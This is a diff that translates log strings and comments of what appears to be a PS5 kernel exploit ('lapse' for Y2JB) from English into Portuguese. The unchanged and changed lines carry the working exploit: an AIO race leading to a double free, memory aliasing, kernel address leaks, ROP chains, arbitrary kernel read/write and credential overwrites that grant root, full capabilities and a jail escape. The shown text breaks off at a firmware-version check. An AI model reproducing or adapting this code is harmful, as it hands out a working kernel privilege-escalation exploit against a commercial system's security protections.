@@ -184,7 +184,7 @@
         function new_socket() {
             const sd = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
             if (sd === 0xffffffffffffffffn) {
-                throw new Error("new_socket error: " + toHex(sd));
+                throw new Error("erro em new_socket: " + toHex(sd));
             }
             return sd
         }
@@ -192,7 +192,7 @@
         function new_tcp_socket() {
             const sd = syscall(SYSCALL.socket, AF_INET, SOCK_STREAM, 0n);
             if (sd === 0xffffffffffffffffn) {
-                throw new Error("new_tcp_socket error: " + toHex(sd));
+                throw new Error("erro em new_tcp_socket: " + toHex(sd));
             }            
             return sd
         }
@@ -200,7 +200,7 @@
         function set_sockopt(sd, level, optname, optval, optlen) {
             const result = syscall(SYSCALL.setsockopt, BigInt(sd), level, optname, optval, BigInt(optlen));
             if (result === 0xffffffffffffffffn) {
-                throw new Error("set_sockopt error: " + toHex(result));
+                throw new Error("erro em set_sockopt: " + toHex(result));
             }
             return result;
         }
@@ -210,7 +210,7 @@
             write32(len_ptr, BigInt(optlen));
             const result = syscall(SYSCALL.getsockopt, BigInt(sd), level, optname, optval, len_ptr);
             if (result === 0xffffffffffffffffn) {
-                throw new Error("get_sockopt error: " + toHex(result));
+                throw new Error("erro em get_sockopt: " + toHex(result));
             }
             return read32(len_ptr);
         }
@@ -249,7 +249,7 @@
         function aio_submit_cmd(cmd, reqs, num_reqs, priority, ids) {
             const result = syscall(SYSCALL.aio_submit_cmd, cmd, reqs, BigInt(num_reqs), priority, ids);
             if (result === 0xffffffffffffffffn) {
-                throw new Error("aio_submit_cmd error: " + toHex(result));
+                throw new Error("erro em aio_submit_cmd: " + toHex(result));
             }
             return result;
         }
@@ -257,7 +257,7 @@
         function aio_multi_delete(ids, num_ids, states) {
             const result = syscall(SYSCALL.aio_multi_delete, ids, BigInt(num_ids), states);
             if (result === 0xffffffffffffffffn) {
-                throw new Error("aio_multi_delete error: " + toHex(result));
+                throw new Error("erro em aio_multi_delete: " + toHex(result));
             }
             return result;
         }
@@ -265,7 +265,7 @@
         function aio_multi_poll(ids, num_ids, states) {
             const result = syscall(SYSCALL.aio_multi_poll, ids, BigInt(num_ids), states);
             if (result === 0xffffffffffffffffn) {
-                throw new Error("aio_multi_poll error: " + toHex(result));
+                throw new Error("erro em aio_multi_poll: " + toHex(result));
             }
             return result;
         }
@@ -273,7 +273,7 @@
         function aio_multi_cancel(ids, num_ids, states) {
             const result = syscall(SYSCALL.aio_multi_cancel, ids, BigInt(num_ids), states);
             if (result === 0xffffffffffffffffn) {
-                throw new Error("aio_multi_cancel error: " + toHex(result));
+                throw new Error("erro em aio_multi_cancel: " + toHex(result));
             }
             return result;
         }
@@ -281,7 +281,7 @@
         function aio_multi_wait(ids, num_ids, states, mode, timeout) {
             const result = syscall(SYSCALL.aio_multi_wait, ids, BigInt(num_ids), states, BigInt(mode), timeout);
             if (result === 0xffffffffffffffffn) {
-                throw new Error("aio_multi_wait error: " + toHex(result));
+                throw new Error("erro em aio_multi_wait: " + toHex(result));
             }
             return result;
         }
@@ -383,7 +383,7 @@
             rop_chain[rop_i++] = return_value_addr;
             rop_chain[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret
             
-            // Return safe tagged value to JavaScript
+            // Retorna um valor marcado seguro para o JavaScript
             rop_chain[rop_i++] = ROP.mov_rax_0x200000000; // mov rax, 0x200000000 ; ret
             rop_chain[rop_i++] = ROP.pop_rbp; // pop rbp ; ret
             rop_chain[rop_i++] = saved_fp;
@@ -420,9 +420,9 @@
             
             const jmpbuf = malloc(0x60);
             
-            write64(jmpbuf + 0x00n, ROP.ret);      // ret addr (RIP)
-            write64(jmpbuf + 0x10n, rop_chain_race1_addr);             // RSP - pivot to rop_chain_race1
-            write32(jmpbuf + 0x40n, BigInt(saved_fpu_ctrl));   // FPU control word
+            write64(jmpbuf + 0x00n, ROP.ret);      // endereço de retorno (RIP)
+            write64(jmpbuf + 0x10n, rop_chain_race1_addr);             // RSP - pivota para rop_chain_race1
+            write32(jmpbuf + 0x40n, BigInt(saved_fpu_ctrl));   // palavra de controle da FPU
             write32(jmpbuf + 0x44n, BigInt(saved_mxcsr));      // MXCSR
             
             const stack_size = 0x400n;
@@ -436,17 +436,17 @@
             
             write64(thr_new_args + 0x00n, longjmp_addr);       // start_func = longjmp
             write64(thr_new_args + 0x08n, jmpbuf);             // arg = jmpbuf
-            write64(thr_new_args + 0x10n, stack);              // stack_base
-            write64(thr_new_args + 0x18n, stack_size);         // stack_size
-            write64(thr_new_args + 0x20n, tls);                // tls_base
-            write64(thr_new_args + 0x28n, tls_size);           // tls_size
-            write64(thr_new_args + 0x30n, tid_addr);           // child_tid (output)
-            write64(thr_new_args + 0x38n, cpid);               // parent_tid (output)
+            write64(thr_new_args + 0x10n, stack);              // base da pilha
+            write64(thr_new_args + 0x18n, stack_size);         // tamanho da pilha
+            write64(thr_new_args + 0x20n, tls);                // base do TLS
+            write64(thr_new_args + 0x28n, tls_size);           // tamanho do TLS
+            write64(thr_new_args + 0x30n, tid_addr);           // child_tid (saída)
+            write64(thr_new_args + 0x38n, cpid);               // parent_tid (saída)
             
             const result = syscall(SYSCALL.thr_new, thr_new_args, 0x68n);
             
             if (result !== 0n) {
-                throw new Error("thr_new failed: " + toHex(result));
+                throw new Error("thr_new falhou: " + toHex(result));
             }
             
             const tid = read64(tid_addr);
@@ -469,7 +469,7 @@
                 pin_to_core(MAIN_CORE);
                 set_rtprio(MAIN_RTPRIO);
 
-                await log("Pinned to core " + get_current_core() + " with prio " + MAIN_RTPRIO);
+                await log("Fixado no core " + get_current_core() + " com prioridade " + MAIN_RTPRIO);
 
                 const sockpair = malloc(8);
                 if (syscall(SYSCALL.socketpair, AF_UNIX, SOCK_STREAM, 0n, sockpair) !== 0n) {
@@ -478,7 +478,7 @@
 
                 block_fd = read32(sockpair);
                 unblock_fd = read32(sockpair + 4n);
-                await log("Created socketpair: block_fd=" + block_fd + " unblock_fd=" + unblock_fd);
+                await log("Socketpair criado: block_fd=" + block_fd + " unblock_fd=" + unblock_fd);
 
                 const block_reqs = malloc(0x28 * NUM_WORKERS);
                 for (let i = 0; i < NUM_WORKERS; i++) {
@@ -493,7 +493,7 @@
                 }
 
                 block_id = read32(block_id_buf);
-                await log("AIO workers blocked with ID: " + block_id);
+                await log("Workers de AIO bloqueados com ID: " + block_id);
                 
                 const num_reqs = 3;
                 const groom_reqs = make_reqs1(num_reqs);
@@ -520,7 +520,7 @@
                 return true;
 
             } catch (e) {
-                await log("Setup failed: " + e.message);
+                await log("Falha na configuração: " + e.message);
                 return false;
             }
         }
@@ -539,7 +539,7 @@
                 set_sockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, enable, 4);
 
                 if (syscall(SYSCALL.bind, sd_listen, server_addr, 16n) !== 0n) {
-                    await log("bind failed");
+                    await log("falha no bind");
                     syscall(SYSCALL.close, sd_listen);
                     return null;
                 }
@@ -547,14 +547,14 @@
                 const addr_len = malloc(4);
                 write32(addr_len, 16n);
                 if (syscall(SYSCALL.getsockname, sd_listen, server_addr, addr_len) !== 0n) {
-                    await log("getsockname failed");
+                    await log("falha no getsockname");
                     syscall(SYSCALL.close, sd_listen);
                     return null;
                 }
-                await log("Bound to port: " + Number(read16(server_addr + 2n)));
+                await log("Vinculado à porta: " + Number(read16(server_addr + 2n)));
 
                 if (syscall(SYSCALL.listen, sd_listen, 1n) !== 0n) {
-                    await log("listen failed");
+                    await log("falha no listen");
                     syscall(SYSCALL.close, sd_listen);
                     return null;
                 }
@@ -568,7 +568,7 @@
                 const cmd = AIO_CMD_MULTI_READ;
 
                 for (let attempt = 1; attempt <= NUM_RACES; attempt++) {
-                    await log("Race attempt " + attempt + "/" + NUM_RACES);
+                    await log("Tentativa de race " + attempt + "/" + NUM_RACES);
 
                     const sd_client = new_tcp_socket();
 
@@ -603,7 +603,7 @@
                     syscall(SYSCALL.close, sd_conn);
 
                     if (sd_pair !== null) {
-                        await log("Won race at attempt " + attempt);
+                        await log("Race vencida na tentativa " + attempt);
                         syscall(SYSCALL.close, sd_listen);
                         return sd_pair;
                     }
@@ -613,7 +613,7 @@
                 return null;
 
             } catch (e) {
-                await log("Stage 1 error: " + e.message);
+                await log("Erro no estágio 1: " + e.message);
                 return null;
             }
         }
@@ -631,13 +631,13 @@
                 
                 const rop_chain_race1 = new BigUint64Array(200);
                 
-                // rop_chain_race1[0] will be overwritten by longjmp, so skip it
+                // rop_chain_race1[0] será sobrescrito pelo longjmp, então é ignorado
                 let rop_i = 1;
 
                 const cpu_mask = malloc(0x10);
                 write16(cpu_mask, BigInt(1 << MAIN_CORE));
                 
-                // Pin to core
+                // Fixa no core
                 rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                 rop_chain_race1[rop_i++] = SYSCALL.cpuset_setaffinity;
                 rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
@@ -656,7 +656,7 @@
                 write16(rtprio_buf, PRI_REALTIME);
                 write16(rtprio_buf + 2n, BigInt(MAIN_RTPRIO));
 
-                // Set priority
+                // Define a prioridade
                 rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                 rop_chain_race1[rop_i++] = SYSCALL.rtprio_thread;
                 rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
@@ -667,14 +667,14 @@
                 rop_chain_race1[rop_i++] = rtprio_buf;
                 rop_chain_race1[rop_i++] = syscall_wrapper;
 
-                // Signal ready
+                // Sinaliza pronto
                 rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                 rop_chain_race1[rop_i++] = ready_signal;
                 rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                 rop_chain_race1[rop_i++] = 1n;
                 rop_chain_race1[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret
                 
-                // Read from pipe (blocks here)
+                // Lê do pipe (bloqueia aqui)
                 rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                 rop_chain_race1[rop_i++] = SYSCALL.read;
                 rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
@@ -685,7 +685,7 @@
                 rop_chain_race1[rop_i++] = 1n;
                 rop_chain_race1[rop_i++] = syscall_wrapper;
 
-                // aio multi delete
+                // deleta multi AIO
                 rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                 rop_chain_race1[rop_i++] = SYSCALL.aio_multi_delete;
                 rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
@@ -696,14 +696,14 @@
                 rop_chain_race1[rop_i++] = sce_errs + 4n;
                 rop_chain_race1[rop_i++] = syscall_wrapper;
 
-                // Signal deletion
+                // Sinaliza exclusão
                 rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
                 rop_chain_race1[rop_i++] = deletion_signal;
                 rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                 rop_chain_race1[rop_i++] = 1n;
                 rop_chain_race1[rop_i++] = ROP.mov_qword_rdi_rax; // mov qword [rdi], rax ; ret
 
-                // Thread exit
+                // Saída da thread
                 rop_chain_race1[rop_i++] = ROP.pop_rax; // pop rax ; ret
                 rop_chain_race1[rop_i++] = SYSCALL.thr_exit;
                 rop_chain_race1[rop_i++] = ROP.pop_rdi; // pop rdi ; ret
@@ -716,18 +716,18 @@
                 
                 const suspend_res = call_suspend_chain(pipe_write_fd, pipe_buf, thr_tid);
                 
-                await log("Suspend result: " + toHex(suspend_res));
+                await log("Resultado do suspend: " + toHex(suspend_res));
 
                 const poll_err = malloc(4);
                 aio_multi_poll(req_addr, 1, poll_err);
                 const poll_res = read32(poll_err);
-                await log("Poll after suspend: " + toHex(poll_res));
+                await log("Poll após o suspend: " + toHex(poll_res));
 
                 const info_buf = malloc(0x100);
                 const info_size = get_sockopt(tcp_sd, IPPROTO_TCP, TCP_INFO, info_buf, 0x100);
                 
                 if (info_size !== size_tcp_info) {
-                    await log("info size isn't " + size_tcp_info + ": " + info_size);
+                    await log("tamanho de info diferente de " + size_tcp_info + ": " + info_size);
                 }
                 
                 const tcp_state = read8(info_buf);
@@ -738,9 +738,9 @@
                 if (poll_res !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
                     aio_multi_delete(req_addr, 1, sce_errs);
                     won_race = true;
-                    await log("Race won!");
+                    await log("Race vencida!");
                 } else {
-                    await log("Race not won (poll_res=" + toHex(poll_res) + " tcp_state=" + toHex(tcp_state) + ")");
+                    await log("Race não vencida (poll_res=" + toHex(poll_res) + " tcp_state=" + toHex(tcp_state) + ")");
                 }
 
                 const resume_result = syscall(SYSCALL.thr_resume_ucontext, thr_tid);
@@ -754,7 +754,7 @@
                     await log("sce_errs: main=" + toHex(err_main_thr) + " worker=" + toHex(err_worker_thr));
 
                     if (err_main_thr === err_worker_thr && err_main_thr === 0n) {
-                        await log("Double-free successful, making aliased rthdrs...");
+                        await log("Double-free bem-sucedido, criando rthdrs aliasados...");
                         const sd_pair = await make_aliased_rthdrs(sds);
                         
                         if (sd_pair !== null) {
@@ -762,10 +762,10 @@
                             syscall(SYSCALL.close, pipe_write_fd);
                             return sd_pair;
                         } else {
-                            await log("Failed to make aliased rthdrs");
+                            await log("Falha ao criar rthdrs aliasados");
                         }
                     } else {
-                        await log("sce_errs mismatch - race failed");
+                        await log("sce_errs divergente - race falhou");
                     }
                 }
 
@@ -774,7 +774,7 @@
                 return null;
 
             } catch (e) {
-                await log("Race error: " + e.message);
+                await log("Erro na race: " + e.message);
                 await log(e.stack);
                 return null;
             }
@@ -805,7 +805,7 @@
                             const aliased_idx = marker - 1;
                             const aliased_sd = Number(sds[aliased_idx]);
                             if (aliased_idx >= 0 && aliased_idx < sds.length && sds[aliased_idx] !== 0xffffffffffffffffn) {
-                                await log("Aliased rthdrs at attempt: " + loop);
+                                await log("rthdrs aliasados na tentativa: " + loop);
 
                                 const sd_pair = [sd, aliased_sd];
                                 const max_idx = Math.max(i-1, aliased_idx);
@@ -827,7 +827,7 @@
         function new_evf(name, flags) {
             const result = syscall(SYSCALL.evf_create, name, 0n, flags);
             if (result === 0xffffffffffffffffn) {
-                throw new Error("evf_create error: " + toHex(result));
+                throw new Error("erro em evf_create: " + toHex(result));
             }
             return result;
         }
@@ -835,11 +835,11 @@
         function set_evf_flags(id, flags) {
             let result = syscall(SYSCALL.evf_clear, id, 0n);
             if (result === 0xffffffffffffffffn) {
-                throw new Error("evf_clear error: " + toHex(result));
+                throw new Error("erro em evf_clear: " + toHex(result));
             }
             result = syscall(SYSCALL.evf_set, id, flags);
             if (result === 0xffffffffffffffffn) {
-                throw new Error("evf_set error: " + toHex(result));
+                throw new Error("erro em evf_set: " + toHex(result));
             }
             return result;
         }
@@ -847,7 +847,7 @@
         function free_evf(id) {
             const result = syscall(SYSCALL.evf_delete, id);
             if (result === 0xffffffffffffffffn) {
-                throw new Error("evf_delete error: " + toHex(result));
+                throw new Error("erro em evf_delete: " + toHex(result));
             }
             return result;
         }
@@ -906,7 +906,7 @@
             const buflen = 0x80 * LEAK_LEN;
             const buf = malloc(buflen);
 
-            await log("Confusing evf with rthdr...");
+            await log("Confundindo evf com rthdr...");
 
             const name = malloc(1);
 
@@ -949,23 +949,23 @@
                 }
 
                 if (evf !== null) {
-                    await log("Confused rthdr and evf at attempt: " + i);
+                    await log("rthdr e evf confundidos na tentativa: " + i);
                     break;
                 }
             }
 
             if (evf === null) {
-                await log("Failed to confuse evf and rthdr");
+                await log("Falha ao confundir evf e rthdr");
                 return null;
             }
 
             set_evf_flags(evf, 0xff00n);
 
             const kernel_addr = read64(buf + 0x28n);
-            await log("\"evf cv\" string addr: " + toHex(kernel_addr));
+            await log("Endereço da string \"evf cv\": " + toHex(kernel_addr));
 
             const kbuf_addr = read64(buf + 0x40n) - 0x38n;
-            await log("Kernel buffer addr: " + toHex(kbuf_addr));
+            await log("Endereço do buffer do kernel: " + toHex(kbuf_addr));
 
             const wbufsz = 0x80;
             const wbuf = malloc(wbufsz);
@@ -1027,7 +1027,7 @@
                 }
 
                 if (reqs2_off !== null && fake_reqs3_off !== null) {
-                    await log("Found reqs2 and fake reqs3 at attempt: " + i);
+                    await log("reqs2 e fake reqs3 encontrados na tentativa: " + i);
                     fake_reqs3_sd = sds[sd_idx - 1];
                     sds.splice(sd_idx - 1, 1);
                     free_rthdrs(sds);
@@ -1039,7 +1039,7 @@
             }
 
             if (reqs2_off === null || fake_reqs3_off === null) {
-                await log("Could not leak reqs2 and fake reqs3");
+                await log("Não foi possível vazar reqs2 e fake reqs3");
                 return null;
             }
 
@@ -1048,7 +1048,7 @@
 
             get_rthdr(sd, buf, buflen);
 
-            await log("Leaked aio_entry:");
+            await log("aio_entry vazado:");
 
             let leak_str = "";
             for (let i = 0; i < 0x80; i += 8) {
@@ -1067,7 +1067,7 @@
             await log("reqs1_addr = " + toHex(reqs1_addr));
             await log("fake_reqs3_addr = " + toHex(fake_reqs3_addr));
 
-            await log("Searching for target_id...");
+            await log("Procurando target_id...");
 
             let target_id = null;
             let to_cancel = null;
@@ -1084,7 +1084,7 @@
                     target_id = read32(leak_ids + BigInt(i * 4));
                     write32(leak_ids + BigInt(i * 4), 0n);
 
-                    await log("Found target_id=" + toHex(target_id) + ", i=" + i + ", batch=" + Math.floor(i / num_elems));
+                    await log("target_id encontrado=" + toHex(target_id) + ", i=" + i + ", batch=" + Math.floor(i / num_elems));
 
                     const start = i + num_elems;
                     to_cancel = leak_ids + BigInt(start * 4);
@@ -1095,14 +1095,14 @@
             }
 
             if (target_id === null) {
-                await log("Target ID not found");
+                await log("Target ID não encontrado");
                 return null;
             }
 
             cancel_aios(to_cancel, to_cancel_len);
             free_aios2(leak_ids, leak_ids_len);
 
-            await log("Kernel addresses leaked successfully!");
+            await log("Endereços do kernel vazados com sucesso!");
 
             return {
                 reqs1_addr: reqs1_addr,
@@ -1131,7 +1131,7 @@
                     
                     if (marker !== i) {
                         const sd_pair = [sds[i], sds[marker]];
-                        log("Aliased pktopts at attempt " + loop + " (pair: " + sd_pair[0] + ", " + sd_pair[1] + ")");
+                        log("pktopts aliasados na tentativa " + loop + " (par: " + sd_pair[0] + ", " + sd_pair[1] + ")");
                         
                         if (marker > i) {
                             sds.splice(marker, 1);
@@ -1170,7 +1170,7 @@
             const aio_ids_len = num_batches * num_elems;
             const aio_ids = malloc(4 * aio_ids_len);
             
-            await log("Overwriting rthdr with AIO queue entry...");
+            await log("Sobrescrevendo rthdr com entrada da fila AIO...");
             let aio_not_found = true;
             free_evf(evf);
             
@@ -1181,7 +1181,7 @@
                 const cmd = read32(buf);
                 
                 if (size_ret === 8n && cmd === AIO_CMD_READ) {
-                    await log("Aliased at attempt " + i);
+                    await log("Aliasado na tentativa " + i);
                     aio_not_found = false;
                     cancel_aios(aio_ids, aio_ids_len);
                     break;
@@ -1191,7 +1191,7 @@
             }
             
             if (aio_not_found) {
-                await log("Failed to overwrite rthdr");
+                await log("Falha ao sobrescrever rthdr");
                 return null;
             }
             
@@ -1209,7 +1209,7 @@
                 addr_cache.push(aio_ids + BigInt(i * num_elems * 4));
             }
             
-            await log("Overwriting AIO queue entry with rthdr...");
+            await log("Sobrescrevendo entrada da fila AIO com rthdr...");
             
             syscall(SYSCALL.close, BigInt(sd));
             sd = null;
@@ -1237,7 +1237,7 @@
                         }
                         
                         if (req_idx !== -1) {
-                            await log("Found req_id at batch " + batch + ", attempt " + i);
+                            await log("req_id encontrado no batch " + batch + ", tentativa " + i);
                             
                             const aio_idx = batch * num_elems + req_idx;
                             const req_id_p = aio_ids + BigInt(aio_idx * 4);
@@ -1256,7 +1256,7 @@
             
             const req_id = await overwrite_aio_entry_with_rthdr();
             if (req_id === null) {
-                await log("Failed to overwrite AIO queue entry");
+                await log("Falha ao sobrescrever a entrada da fila AIO");
                 return null;
             }
             
@@ -1275,10 +1275,10 @@
             write32(target_ids, req_id);
             write32(target_ids + 4n, BigInt(target_id));
             
-            await log("Triggering double free...");
+            await log("Disparando double free...");
             aio_multi_delete(target_ids, 2, sce_errs);
             
-            await log("Reclaiming memory...");
+            await log("Recuperando memória...");
             const sd_pair = make_aliased_pktopts(sds_alt);
             
             const err1 = read32(sce_errs);
@@ -1291,22 +1291,22 @@
             
             let success = true;
             if (read32(states) !== SCE_KERNEL_ERROR_ESRCH) {
-                await log("ERROR: Bad delete of corrupt AIO request");
+                await log("ERRO: deleção inválida de requisição AIO corrompida");
                 success = false;
             }
             
             if (err1 !== 0n || err1 !== err2) {
-                await log("ERROR: Bad delete of ID pair");
+                await log("ERRO: deleção inválida do par de IDs");
                 success = false;
             }
             
             if (!success) {
-                await log("Double free failed");
+                await log("Double free falhou");
                 return null;
             }
             
             if (sd_pair === null) {
-                await log("Failed to make aliased pktopts");
+                await log("Falha ao criar pktopts aliasados");
                 return null;
             }
             
@@ -1317,7 +1317,7 @@
             try {
                 const master_sock = pktopts_sds[0];
                 const tclass = malloc(4);
-                const off_tclass = 0xc0n;  // PS5 offset
+                const off_tclass = 0xc0n;  // offset do PS5
                 
                 const pktopts_size = 0x100;
                 const pktopts = malloc(pktopts_size);
@@ -1327,7 +1327,7 @@
                 // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
                 write64(pktopts + 0x10n, pktinfo_p);
                 
-                await log("Overwriting main pktopts");
+                await log("Sobrescrevendo pktopts principal");
                 let reclaim_sock = null;
                 
                 syscall(SYSCALL.close, pktopts_sds[1]);
@@ -1341,7 +1341,7 @@
                     get_sockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                     const marker = read32(tclass);
                     if ((marker & 0xffffn) === 0x4141n) {
-                        await log("Found reclaim socket at attempt: " + i);
+                        await log("Socket de recuperação encontrado na tentativa: " + i);
                         const idx = Number(marker >> 16n);
                         reclaim_sock = sds_alt[idx];
                         sds_alt.splice(idx, 1);
@@ -1350,7 +1350,7 @@
                 }
                 
                 if (reclaim_sock === null) {
-                    await log("Failed to overwrite main pktopts");
+                    await log("Falha ao sobrescrever pktopts principal");
                     return null;
                 }
                 
@@ -1388,17 +1388,17 @@
                 await log("*(\"evf cv\"): " + kstr);
                 
                 if (kstr !== "evf cv") {
-                    await log("Test read of \"evf cv\" failed");
+                    await log("Leitura de teste de \"evf cv\" falhou");
                     return null;
                 }
                 
-                await log("Slow arbitrary kernel read achieved");
+                await log("Leitura lenta arbitrária do kernel obtida");
                 
-                // Get curproc from previously freed aio_info
+                // Obtém curproc a partir do aio_info liberado anteriormente
                 const curproc = slow_kread8(aio_info_addr + 8n);
                 
                 if (Number(curproc >> 48n) !== 0xffff) {
-                    await log("Invalid curproc kernel address: " + toHex(curproc));
+                    await log("Endereço de curproc do kernel inválido: " + toHex(curproc));
                     return null;
                 }
                 
@@ -1406,7 +1406,7 @@
                 const current_pid = syscall(SYSCALL.getpid);
                 
                 if ((possible_pid & 0xffffffffn) !== (current_pid & 0xffffffffn)) {
-                    await log("curproc verification failed: " + toHex(curproc));
+                    await log("verificação de curproc falhou: " + toHex(curproc));
                     return null;
                 }
                 
@@ -1433,13 +1433,13 @@
                 const worker_sock = new_socket();
                 const worker_pktinfo = malloc(pktinfo_len);
                 
-                // Create pktopts on worker_sock
+                // Cria pktopts no worker_sock
                 set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, pktinfo_len);
                 
                 const worker_pktopts = get_sock_pktopts(worker_sock, slow_kread8);
                 
-                write64(pktinfo, worker_pktopts + 0x10n);  // overlap pktinfo
-                write64(pktinfo + 8n, 0n);  // clear .ip6po_nexthop
+                write64(pktinfo, worker_pktopts + 0x10n);  // sobrepõe pktinfo
+                write64(pktinfo + 8n, 0n);  // zera .ip6po_nexthop
                 set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                 
                 function kread20(addr, buf) {
@@ -1459,7 +1459,7 @@
                     return read64(worker_pktinfo);
                 }
                 
-                // Note: this will write our 8 bytes + remaining 12 bytes as null
+                // Nota: isto escreve nossos 8 bytes + os 12 bytes restantes como nulos
                 function restricted_kwrite8(addr, val) {
                     write64(worker_pktinfo, val);
                     write64(worker_pktinfo + 8n, 0n);
@@ -1470,13 +1470,13 @@
                 write64(read_buf, kread8(kernel_addr));
                 const kstr2 = read_null_terminated_string(read_buf);
                 if (kstr2 !== "evf cv") {
-                    await log("Test read of \"evf cv\" failed");
+                    await log("Leitura de teste de \"evf cv\" falhou");
                     return null;
                 }
                 
-                await log("Restricted kernel r/w achieved");
+                await log("Leitura/escrita restrita do kernel obtida");
                 
-                // Initialize ipv6_kernel_rw with restricted write
+                // Inicializa ipv6_kernel_rw com escrita restrita
                 ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kread8, restricted_kwrite8);
                 
                 kernel.read_buffer = ipv6_kernel_rw.read_buffer;
@@ -1486,14 +1486,14 @@
                 
                 const kstr3 = kernel.read_null_terminated_string(kernel_addr);
                 if (kstr3 !== "evf cv") {
-                    await log("Test read of \"evf cv\" failed");
+                    await log("Leitura de teste de \"evf cv\" falhou");
                     return null;
                 }
                 
-                await log("Arbitrary kernel r/w achieved!");
+                await log("Leitura/escrita arbitrária do kernel obtida!");
                 
-                // RESTORE: clean corrupt pointers
-                const off_ip6po_rthdr = 0x70n;  // PS5 offset
+                // RESTAURAÇÃO: limpa ponteiros corrompidos
+                const off_ip6po_rthdr = 0x70n;  // offset do PS5
                 
                 for (let i = 0; i < sds.length; i++) {
                     const sock_pktopts = get_sock_pktopts(sds[i], kernel.read_qword);
@@ -1513,18 +1513,18 @@
                     reclaim_sock
                 ];
                 
-                // Increase ref counts to prevent deallocation
+                // Aumenta as contagens de referência para evitar desalocação
                 for (const each of sock_increase_ref) {
                     const sock_addr = get_fd_data_addr(each, kernel.read_qword);
                     kernel.write_dword(sock_addr + 0x0n, 0x100n);  // so_count
                 }
                 
-                await log("Fixes applied");
+                await log("Correções aplicadas");
                 
                 return true;
                 
             } catch (e) {
-                await log("make_kernel_arw error: " + e.message);
+                await log("erro em make_kernel_arw: " + e.message);
                 await log(e.stack);
                 return null;
             }
@@ -1548,7 +1548,7 @@
                     }
                     p = kernel.read_qword(p);
                 }
-                throw new Error(`failed to find proc with pid ${pid}`);
+                throw new Error(`falha ao encontrar processo com pid ${pid}`);
             }
             
             function get_rootvnode() {
@@ -1590,17 +1590,17 @@
             kernel.write_dword(ucred + 0x14n, 0n); // cr_rgid
             kernel.write_dword(ucred + 0x18n, 0n); // cr_svgid
 
-            // escalate sony privs
+            // eleva os privilégios da Sony
             kernel.write_qword(ucred + OFFSET_UCRED_CR_SCEAUTHID, SYSCORE_AUTHID); // cr_sceAuthID
 
-            // enable all app capabilities
+            // habilita todas as capacidades do app
             kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS, 0xffffffffffffffffn); // cr_sceCaps[0]
             kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS + 8n, 0xffffffffffffffffn); // cr_sceCaps[1]
 
-            // set app attributes
+            // define atributos do app
             kernel.write_byte(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80n); // SceAttrs
  
-            // Allow root file system access.
+            // Permite acesso ao sistema de arquivos raiz.
             const rootvnode = get_rootvnode();        
             const p_fd = kernel.read_qword(p + 0x48n);
             
@@ -1608,16 +1608,16 @@
             kernel.write_qword(p_fd + 0x10n, rootvnode);  // fd_rdir
             kernel.write_qword(p_fd + 0x18n, 0n);         // fd_jdir
             
-            // Allow syscall from everywhere.
+            // Permite syscall de qualquer lugar.
             const p_dynlib = kernel.read_qword(p + 0x3e8n);
-            kernel.write_qword(p_dynlib + 0xf0n, 0n);                    // start
-            kernel.write_qword(p_dynlib + 0xf8n, 0xFFFFFFFFFFFFFFFFn);   // end
+            kernel.write_qword(p_dynlib + 0xf0n, 0n);                    // início
+            kernel.write_qword(p_dynlib + 0xf8n, 0xFFFFFFFFFFFFFFFFn);   // fim
             
-            // Allow dlsym.
+            // Permite dlsym.
             const dynlib_eboot = kernel.read_qword(p_dynlib + 0x00n);
             const eboot_segments = kernel.read_qword(dynlib_eboot + 0x40n);
-            kernel.write_qword(eboot_segments + 0x08n, 0n);                   // addr
-            kernel.write_qword(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);  // size
+            kernel.write_qword(eboot_segments + 0x08n, 0n);                   // endereço
+            kernel.write_qword(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);  // tamanho
             
             const master_pipe = create_nonblock_pipe();
             const victim_pipe = create_nonblock_pipe();
@@ -1641,7 +1641,7 @@
         }
         
         async function cleanup() {
-            await log("Performing cleanup...");
+            await log("Executando limpeza...");
 
             try {
                 if (block_fd !== 0xffffffffffffffffn) {
@@ -1690,81 +1690,84 @@
                     sds_alt = null;
                 }
 
-                await log("Cleanup completed");
+                await log("Limpeza concluída");
 
             } catch (e) {
-                await log("Error during cleanup: " + e.message);
+                await log("Erro durante a limpeza: " + e.message);
             }
         }
         
         ////////////////////
-        // MAIN EXECUTION //
+        // EXECUÇÃO PRINCIPAL //
         ////////////////////
         
         await log(lapse_version);
         send_notification(lapse_version);
         
         if(typeof load_aioshellcode === "undefined") {
-            await log("Update Y2JB to at least 1.5 version");
-            send_notification("Update Y2JB to at least 1.5 version");
+            await log("Atualize o Y2JB para pelo menos a versão 1.5");
+            send_notification("Atualize o Y2JB para pelo menos a versão 1.5");
             return;
         }
         
         if (compare_version(FW_VERSION, "10.01") > 0) {
-            await log("Unsupported fw " + FW_VERSION);
-            send_notification("Unsupported fw " + FW_VERSION);
+            await log("Firmware não suportado " + FW_VERSION);
